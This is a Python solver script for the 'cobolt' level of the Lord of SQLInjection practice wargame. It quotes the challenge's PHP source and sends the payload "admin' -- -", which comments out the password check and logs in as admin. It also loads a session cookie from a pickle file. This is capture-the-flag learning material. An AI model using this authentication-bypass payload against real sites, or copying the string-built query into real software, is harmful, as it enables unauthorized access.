#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Cobolt

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id'] == 'admin') solve("cobolt");
    elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
    '''

    url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    param = dict(id="admin' -- -")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('COBOLT Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
